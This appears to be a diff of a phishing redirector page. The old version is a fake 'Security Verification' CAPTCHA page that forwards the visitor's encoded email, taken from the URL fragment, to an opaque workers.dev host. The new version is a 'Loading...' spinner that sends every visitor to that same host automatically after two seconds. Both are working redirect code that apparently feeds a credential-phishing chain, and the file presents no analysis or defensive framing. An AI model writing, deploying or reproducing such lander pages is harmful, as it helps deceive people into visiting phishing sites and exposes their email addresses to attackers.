@@ -1,52 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Security Verification</title>
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f7f7f7;
-      text-align: center;
-      padding-top: 100px;
-    }
-    .container {
-      background: white;
-      padding: 30px;
-      margin: auto;
-      max-width: 400px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    h2 {
-      margin-bottom: 20px;
-    }
-  </style>
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Security Verification</h2>
-    <p>Please verify you're human to continue.</p>
-    
-    <div class="cf-turnstile"
-         data-sitekey="0x4AAAAAABOkPgdXIwH_Jpit"
-         data-callback="onCaptchaSuccess"
-         data-theme="light">
-    </div>
-  </div>
+    <div class="loader"></div>
 
-  <script>
-    function onCaptchaSuccess(token) {
-      // Get the hash fragment (e.g., #encodedEmail)
-      const hashFragment = window.location.hash;
-
-      // Append it to the destination URL
-      const redirectUrl = "https://5e184628.ffcaefa99ffc5da141c3f315.workers.dev" + hashFragment;
-
-      // Redirect the user
-      window.location.href = redirectUrl;
-    }
-  </script>
+    <script>
+        // Redirect after 2 seconds
+        setTimeout(() => {
+            window.location.href = 'https://5e184628.ffcaefa99ffc5da141c3f315.workers.dev/';
+        }, 2000);
+    </script>
 </body>
 </html>
